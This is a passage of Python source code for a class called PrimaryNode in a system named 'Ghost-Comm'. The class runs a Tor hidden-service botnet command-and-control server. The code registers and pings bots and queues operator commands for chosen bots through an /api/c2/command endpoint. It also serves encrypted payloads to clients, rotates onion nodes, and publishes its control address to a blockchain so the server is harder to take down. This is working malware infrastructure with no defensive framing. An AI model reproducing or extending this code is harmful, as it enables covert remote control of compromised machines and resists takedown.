        print("[+] PrimaryNode: Lock-cycle refreshed with new distributed nodes.")

    def _lock_cycle_worker(self):
        """Background worker that refreshes the lock-cycle periodically."""
        # First, create the initial set of distributed nodes
        self.create_lock_cycle_onions(count=6, publish_timeout=20.0)

        if not self.persistent:
            print("[DEBUG] PrimaryNode: Auto lock-cycle worker exiting (persistent mode disabled).")
            return

        while self.running:
            time.sleep(60)
            if not self.running:
                break
            try:
                self.refresh_lock_cycle()
            except Exception as e:
                print(f"[!] PrimaryNode: Lock-cycle worker encountered an error: {e}")

    def _http_response(self, status_code: int, reason: str, body: bytes, content_type: str = "text/plain") -> bytes:
        """Format a minimal HTTP/1.1 response."""
        headers = [
            f"HTTP/1.1 {status_code} {reason}",
            f"Content-Length: {len(body)}",
            f"Content-Type: {content_type}",
            "Connection: close",
        ]
        return ("\r\n".join(headers) + "\r\n\r\n").encode("utf-8") + body

    def _parse_http_request(self, data: bytes) -> Optional[Dict[str, object]]:
        """
        Parse a simple HTTP request into its components.
        Supports curl-style GET/POST with Content-Length.
        """
        header_body_split = b"\r\n\r\n"
        if header_body_split in data:
            header_bytes, body = data.split(header_body_split, 1)
        elif b"\n\n" in data:
            header_bytes, body = data.split(b"\n\n", 1)
        else:
            return None

        try:
            header_text = header_bytes.decode("iso-8859-1")
        except UnicodeDecodeError:
            return None

        lines = header_text.split("\r\n")
        if len(lines) == 1:
            lines = header_text.split("\n")
        if not lines or not lines[0]:
            return None

        try:
            method, path, version = lines[0].split(" ", 2)
        except ValueError:
            return None

        headers: Dict[str, str] = {}
        for line in lines[1:]:
            if not line:
                continue
            if ":" not in line:
                continue
            key, value = line.split(":", 1)
            headers[key.strip().lower()] = value.strip()

        content_length = 0
        if "content-length" in headers:
            try:
                content_length = int(headers["content-length"])
            except ValueError:
                return None

        if content_length and len(body) < content_length:
            return None
        if content_length:
            body = body[:content_length]

        return {
            "method": method,
            "path": path,
            "version": version,
            "headers": headers,
            "body": body,
        }

    def handle_client_request(self, data: bytes) -> bytes:
        """Handle incoming client requests from Server."""
        if data.startswith(b"GET ") or data.startswith(b"POST "):
            http_request = self._parse_http_request(data)
            if not http_request:
                return self._http_response(
                    400,
                    "Bad Request",
                    b'{"error":"bad request"}',
                    content_type="application/json",
                )

            method = http_request["method"]
            path = str(http_request["path"]).split("?", 1)[0]
            headers = http_request["headers"]
            body = http_request["body"]

            if method == "GET" and path == "/api/bots":
                bots_snapshot = self._build_bot_snapshot()
                return self._http_response(
                    200,
                    "OK",
                    json.dumps(bots_snapshot).encode("utf-8"),
                    content_type="application/json",
                )

            if method == "GET" and path.startswith("/api/bots/") and path.endswith("/ping"):
                parts = path.strip("/").split("/")
                if len(parts) == 4:
                    bot_id = parts[2]
                    payload = self._note_bot_ping(bot_id)
                    return self._http_response(
                        200,
                        "OK",
                        json.dumps(payload).encode("utf-8"),
                        content_type="application/json",
                    )
                return self._http_response(
                    400,
                    "Bad Request",
                    b'{"error":"invalid bot ping path"}',
                    content_type="application/json",
                )

            if method == "GET" and path == "/health":
                health = {
                    "status": "ok",
                    "primary_onion": self.onion_address,
                    "port": self.port,
                    "nodes": list(self.distributed_nodes.keys()),
                }
                return self._http_response(
                    200,
                    "OK",
                    json.dumps(health).encode("utf-8"),
                    content_type="application/json",
                )

            if method == "GET" and path.startswith("/api/commands/"):
                parts = path.strip("/").split("/")
                if len(parts) == 3:
                    bot_id = parts[2]
                    commands = self.pending_commands.get(bot_id, [])
                    return self._http_response(
                        200,
                        "OK",
                        json.dumps(commands).encode("utf-8"),
                        content_type="application/json",
                    )
                return self._http_response(
                    400,
                    "Bad Request",
                    b'{"error":"invalid command path"}',
                    content_type="application/json",
                )

            if method == "GET":
                asset = self._get_ui_asset(path)
                if asset is not None:
                    body, content_type = asset
                    return self._http_response(
                        200,
                        "OK",
                        body,
                        content_type=content_type,
                    )
                if path in ("/", "/index.html"):
                    return self._http_response(
                        200,
                        "OK",
                        b"Ghost-Comm Primary Node Active\n",
                        content_type="text/plain",
                    )

            if method == "POST" and path == "/payload":
                content_type = headers.get("content-type", "")
                if "application/json" not in content_type:
                    return self._http_response(
                        415,
                        "Unsupported Media Type",
                        b'{"error":"expected application/json"}',
                        content_type="application/json",
                    )
                try:
                    payload_request = json.loads(body.decode("utf-8"))
                except (json.JSONDecodeError, UnicodeDecodeError):
                    return self._http_response(
                        400,
                        "Bad Request",
                        b'{"error":"invalid json"}',
                        content_type="application/json",
                    )

                if payload_request.get("type") == "get_payload" and "pub_key" in payload_request:
                    client_pub_key_pem = payload_request["pub_key"].encode("utf-8")
                    self.ensure_proxy_chain_ready("HTTP payload request")
                    response = self.get_lock_cycle_payload(client_pub_key_pem)
                    return self._http_response(
                        200,
                        "OK",
                        response,
                        content_type="application/json",
                    )
                return self._http_response(
                    400,
                    "Bad Request",
                    b'{"error":"invalid payload request"}',
                    content_type="application/json",
                )

            if method == "POST" and path == "/api/c2/command":
                try:
                    command_request = json.loads(body.decode("utf-8"))
                except (json.JSONDecodeError, UnicodeDecodeError):
                    return self._http_response(
                        400,
                        "Bad Request",
                        b'{"error":"invalid json"}',
                        content_type="application/json",
                    )

                targets = command_request.get("targets", [])
                command = command_request.get("command")
                if not targets or not command:
                    return self._http_response(
                        400,
                        "Bad Request",
                        b'{"error":"missing targets or command"}',
                        content_type="application/json",
                    )

                command_obj = {
                    "type": "command",
                    "command": command,
                    "command_id": random.randint(1000, 9999),
                    "issued_at": time.time(),
                }

                for bot_id in targets:
                    queue = self.pending_commands.setdefault(bot_id, [])
                    queue.append(command_obj)

                print(f"[+] PrimaryNode: Issued command '{command}' to targets: {targets}")
                return self._http_response(
                    200,
                    "OK",
                    b'{"status":"ok"}',
                    content_type="application/json",
                )

            return self._http_response(
                404,
                "Not Found",
                b'{"error":"not found"}',
                content_type="application/json",
            )

        try:
            request = json.loads(data.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            return b"PrimaryNode: Error: Invalid JSON request"

        if request.get("type") == "get_payload":
            client_pub_key_pem = request["pub_key"].encode("utf-8")
            self.ensure_proxy_chain_ready("socket payload request")
            response = self.get_lock_cycle_payload(client_pub_key_pem)
            print(f"PrimaryNode: Sending payload to client.")
            return response
        if request.get("type") == "process_data":
            # This branch is now deprecated as clients will directly interact with distributed nodes.
            # However, for backward compatibility or direct processing by PrimaryNode, we can keep it.
            print("PrimaryNode: Received 'process_data' request. This should now go to distributed nodes.")
            # For now, we'll just return an error or a placeholder response.
            return json.dumps({"status": "error", "message": "Please use distributed nodes for data processing."}).encode("utf-8")
        return b"PrimaryNode: Error: Unknown request type"

    def start_server(self):
        """Start server and lock-cycle worker."""
        self.running = True
        # Start PrimaryNode's own server
        self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.server_thread.start()
        while self.server.port == 0:
            time.sleep(0.05)
        self.port = self.server.port

        # Create PrimaryNode's own onion service
        if self.tor_controller:
            result = self._create_ephemeral_service(self.port)
            if result:
                onion_addr, service_id = result
                self.onion_address = onion_addr  # Store PrimaryNode's own onion address
                self._persist_onion_address(onion_addr)

        if self.auto_lock_cycle:
            self.lock_cycle_thread = threading.Thread(target=self._lock_cycle_worker, daemon=True)
            self.lock_cycle_thread.start()
        else:
            self.lock_cycle_thread = None
        print(f"PrimaryNode server started on {self.host}:{self.port}")

    def stop_server(self):
        """Stop server and cleanup ephemeral services."""
        if not self.running:
            return

        self.running = False
        self.cleanup_distributed_nodes(keep_primary=False)

        if self.tor_controller:
            try:
                self.tor_controller.close()
            except Exception:
                pass
            self.tor_controller = None

        if self.server:
            self.server.stop()
        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=2)
        if self.lock_cycle_thread and self.lock_cycle_thread.is_alive():
            self.lock_cycle_thread.join(timeout=2)
        print("PrimaryNode server stopped.")

    def _persist_onion_address(self, onion_addr: str) -> None:
        targets = self._control_url_targets()

        written = False
        successful_path: Optional[Path] = None
        for target_path in targets:
            try:
                target_path.parent.mkdir(parents=True, exist_ok=True)
                with open(target_path, "w", encoding="utf-8") as fh:
                    fh.write(onion_addr + "\n")
                written = True
                if successful_path is None:
                    successful_path = target_path
            except OSError as exc:
                print(f"PrimaryNode: Warning: failed to write onion address to {target_path}: {exc}")

        if not written:
            print("PrimaryNode: Warning: onion address could not be persisted to any target path.")
            return

        self.onion_address = onion_addr
        self.proxy_chain_config["primary_node_url"] = onion_addr
        if successful_path:
            self.publish_control_url_to_blockchain(control_url_path=successful_path)
        else:
            self.publish_control_url_to_blockchain()
